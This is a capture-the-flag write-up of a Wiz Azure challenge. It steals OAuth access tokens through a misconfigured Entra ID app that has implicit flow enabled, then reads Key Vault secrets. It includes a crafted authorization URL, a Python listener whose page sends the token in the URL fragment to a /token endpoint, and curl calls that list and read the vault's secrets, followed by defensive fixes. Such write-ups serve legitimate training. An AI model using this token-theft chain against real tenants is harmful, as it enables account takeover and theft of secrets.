# 04 — Breaking The Barriers

**Platform:** Wiz CTF (Public — Free Challenge)
**Category:** Azure Security · OAuth 2.0 · Entra ID Exploitation
**Difficulty:** Hard
**Result:** ✅ Flag Captured

---

## Scenario

An Azure environment has misconfigured OAuth settings in an Entra ID (Azure AD) application registration. Exploit the misconfiguration to obtain an access token, escalate your access, and retrieve the flag from Azure Key Vault.

---

## Step 1 — Reconnaissance

### DNS & Web Recon

```bash
# Enumerate subdomains
subfinder -d target-domain.com -silent

# Check for Azure-specific DNS entries
host target-domain.com
# Look for: *.azurewebsites.net, *.azurefd.net, *.windows.net
```

### Identify Azure Tenant

```bash
# Get tenant ID from a known user/domain
curl "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" \
  | python3 -m json.tool | grep issuer

# Also check:
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
```

### Enumerate App Registrations

Inspecting the web application's source code and HTTP responses revealed:

```javascript
// Found in page source / JS bundle
const msalConfig = {
  auth: {
    clientId: "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    authority: "https://login.microsoftonline.com/<tenant-id>",
    redirectUri: "https://app.target.com/callback"
  }
};
```

We now have the `client_id` and `tenant_id`.

---

## Step 2 — Identify OAuth Misconfiguration

Using the `client_id`, check the app registration's OAuth configuration:

```bash
# Check if implicit flow is enabled by attempting an implicit flow request
curl -v "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize?\
client_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890\
&response_type=token\
&redirect_uri=https://app.target.com/callback\
&scope=https://vault.azure.net/user_impersonation\
&response_mode=fragment\
&nonce=abc123"
```

**Finding:** The app had **implicit grant flow enabled** (`response_type=token`), which returns access tokens directly in the URL fragment — bypassing the more secure authorization code flow.

---

## Step 3 — Capture the Access Token

### Set Up Token Capture

With implicit flow enabled and a predictable or controllable redirect URI, set up a listener:

```bash
# Simple Python listener to capture the token from the URL fragment
python3 -c "
import http.server, urllib.parse, sys

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('[+] Request received:', self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<html><body><script>fetch(\"/token?t=\"+window.location.hash)</script></body></html>')
    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"
```

### Craft the Authorization URL

```
https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/authorize
  ?client_id=a1b2c3d4-e5f6-7890-abcd-ef1234567890
  &response_type=token
  &redirect_uri=https://app.target.com/callback
  &scope=https://vault.azure.net/.default
  &response_mode=fragment
  &state=xyz
  &nonce=random123
```

When a logged-in user visits this URL, the access token is returned in the URL fragment after the `#`:

```
https://app.target.com/callback#access_token=eyJ...&token_type=Bearer&expires_in=3599
```

---

## Step 4 — Decode and Analyse the JWT Token

```bash
TOKEN="eyJ..."

# Decode header
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool

# Decode payload (claims)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

**Decoded claims:**
```json
{
  "aud": "https://vault.azure.net",
  "iss": "https://sts.windows.net/<tenant-id>/",
  "appid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "oid": "<user-object-id>",
  "roles": ["Key Vault Secrets User"],
  "scp": "user_impersonation",
  "upn": "challenge-user@tenant.onmicrosoft.com",
  "exp": 1700000000,
  "xms_mirid": "/subscriptions/<sub-id>/..."
}
```

The token has `Key Vault Secrets User` role — we can read Key Vault secrets.

---

## Step 5 — Enumerate the Key Vault

```bash
# Find the Key Vault name (from DNS recon or app config)
# Pattern: <name>.vault.azure.net

# List all secrets in the vault
curl -s \
  -H "Authorization: Bearer $TOKEN" \
  "https://challenge-vault.vault.azure.net/secrets?api-version=7.3" \
  | python3 -m json.tool

# Response:
# {
#   "value": [
#     {"id": "https://challenge-vault.vault.azure.net/secrets/flag", ...},
#     {"id": "https://challenge-vault.vault.azure.net/secrets/connection-string", ...}
#   ]
# }
```

---

## Step 6 — Retrieve the Flag

```bash
# Get the latest version of the flag secret
curl -s \
  -H "Authorization: Bearer $TOKEN" \
  "https://challenge-vault.vault.azure.net/secrets/flag?api-version=7.3" \
  | python3 -m json.tool

# Response:
# {
#   "value": "WIZ{oauth_implicit_flow_token_theft_ghi012}",
#   "id": "https://challenge-vault.vault.azure.net/secrets/flag/abc123",
#   "attributes": { "enabled": true }
# }
```

```
WIZ{oauth_implicit_flow_token_theft_ghi012}
```

✅ **FLAG CAPTURED**

---

## Full Exploit Chain Summary

```
App registration discovered via page source
          ↓
OAuth implicit flow enabled (response_type=token)
          ↓
Crafted authorization URL → user token returned in URL fragment
          ↓
Decoded JWT → confirmed Key Vault Secrets User role
          ↓
Queried Key Vault REST API with Bearer token
          ↓
Read flag from Key Vault secret
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| `subfinder` | Subdomain enumeration |
| Browser DevTools | Locating client_id and OAuth config in page source |
| `curl` | OAuth flow interaction and Key Vault API calls |
| `base64` + `python3` | JWT payload decoding |
| Python HTTP server | Token capture listener |

---

## Why Implicit Flow is Dangerous

```
Authorization Code Flow (CORRECT):
Browser → Auth Server → returns code (short-lived, single-use)
         → Backend exchanges code for token (server-to-server)
         Token never appears in browser history or logs ✅

Implicit Flow (DANGEROUS):
Browser → Auth Server → returns token in URL fragment (#access_token=eyJ...)
         Token appears in:
           ✗ Browser history
           ✗ Server access logs (as referrer)
           ✗ JavaScript accessible via window.location.hash
           ✗ Network logs
           ✗ Shoulder surfing
```

---

## Key Takeaways

> **1. Disable OAuth implicit grant flow for all app registrations.**
> It returns tokens in URLs — visible in browser history, logs, and referrer headers.
> Use **Authorization Code flow with PKCE** for all public clients.

> **2. Audit Entra ID app registrations regularly.**
> Look for: implicit flow enabled, wildcard redirect URIs, overly broad API permissions,
> and admin consent grants to third-party apps.

> **3. Tokens are identity. Stolen tokens = stolen access.**
> Treat Bearer tokens like passwords. Any token exposed in a URL is compromised.

> **4. Key Vault RBAC should follow least privilege.**
> The affected identity should only have access to the specific secrets it needs,
> not `Key Vault Secrets User` at the vault level.

---

## Defensive Recommendations

```
Azure Portal → App Registrations → <App> → Authentication
→ Under "Implicit grant and hybrid flows":
   ✗ Uncheck "Access tokens"
   ✗ Uncheck "ID tokens"
→ Under "Supported account types": restrict to your tenant
→ Under "Redirect URIs": remove wildcards, use exact URIs only
```

| Finding | Fix |
|---|---|
| Implicit flow enabled | Disable — use Authorization Code + PKCE instead |
| Token in URL fragment | Implicit flow disabled solves this |
| Key Vault access | Restrict to specific secrets using RBAC conditions |
| No token lifetime policy | Create Conditional Access token lifetime policy |
| No MFA on account | Enforce MFA via Conditional Access for all users |

```bash
# Audit app registrations for implicit flow
az ad app list --all --query "[?oauth2AllowImplicitFlow==\`true\`].{name:displayName, appId:appId}" -o table
```

---

## MITRE ATT&CK Mapping

| Technique | ID | How It Applied |
|---|---|---|
| Steal Application Access Token | T1528 | OAuth implicit flow token capture |
| Use Alternate Auth Material — App Token | T1550.001 | Bearer token used for API access |
| Cloud Service Discovery | T1526 | Key Vault secret enumeration |
| Data from Cloud Storage | T1530 | Flag read from Key Vault |

---

*[← Back to CTF Notes Index](../README.md)*
